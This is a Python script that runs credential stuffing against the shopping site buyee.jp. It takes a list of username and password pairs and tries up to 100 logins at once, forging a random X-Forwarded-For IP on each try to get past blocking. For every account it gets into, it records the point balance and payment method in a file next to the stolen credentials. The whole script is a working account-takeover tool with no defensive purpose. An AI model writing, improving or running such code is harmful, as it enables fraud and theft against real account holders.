# -*- coding:utf-8 -*-
import requests
import random
from lxml import etree
import threading
import sys


def get_info(username, password):
    session = login(username, password)
    if not session:
        session = login(username, password)
        if not session:
            return None

    print("开始获取 %s 的信息"%username)
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }

    # 获取点数
    url = "https://buyee.jp/mypoints/point/history"

    try:
        html = session.get(url, headers=header, timeout=60).text
        html = etree.HTML(html)
        buyee_num = html.xpath("//table[@class='noborder_table pointAvailable_table']/tbody/tr/td/text()")[0]
        # print(buyee_num) #0 点数
    except Exception:
        buyee_num = "点数未查到"

    #获取付款方式
    url = "https://buyee.jp/mypayments"
    try:
        html = session.get(url, headers=header, timeout=60).text
        html = etree.HTML(html)
        buyee_pay = html.xpath("//div[@class='payment_method_info selected']/h2/text()")[0]
        # print(buyee_pay)

    except Exception:
        buyee_pay = "付款方式未查到"

    info_f = open("info.txt", "a+")
    info_f.write(username + "----" + password + "----" + buyee_num + "----" + buyee_pay + "\n")
    info_f.close()
    print("%s 信息获取完毕"%username)


def login(username, password):
    print("开始登陆：%s——%s"%(username, password))
    ip = "%d.%d.%d.%d" % (random.randint(1, 254),random.randint(1, 254),random.randint(1, 254),random.randint(1, 254))
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "X-Forwarded-For": ip,
    }
    url = "https://buyee.jp/signup/login"

    session = requests.session()
    try:
        html = session.get(url, headers=header, timeout=30).text
    except Exception:
        return 1
    # print(html.request.headers)

    html = etree.HTML(html)
    token = html.xpath("//input[@name='login[_csrf_token]']/@value")[0]
    # print(token)

    data = {
        "login[mailAddress]": username,
        "login[password]": password,
        "login[_csrf_token]": token,
    }

    try:
        response = session.post(url, data=data, headers=header, timeout=30).text
    except Exception:
        return 1

    if ("我的主页" in response) or ("我的主頁" in response) or ("マイページ" in response) or ("My Page" in response):
        print("登陆成功: %s" % username)
        return session
    else:
        print("登陆失败: %s----%s" % (username, password))
        return False


def main():
    file_name = sys.argv[1]

    t_list = []
    with open(file_name, "rb") as f:
        for text in f:
            if len(t_list) >= 100:
                for t in t_list:
                    t.join()
                    t_list.remove(t)
            else:
                line_text = text.strip().decode()
                try:
                    username = line_text[:line_text.index("----")]
                    password = line_text[line_text.rindex("----")+4:]
                except Exception:
                    continue

                t = threading.Thread(target=get_info, args=(username, password))
                t.start()
                t_list.append(t)


if __name__ == "__main__":
    main()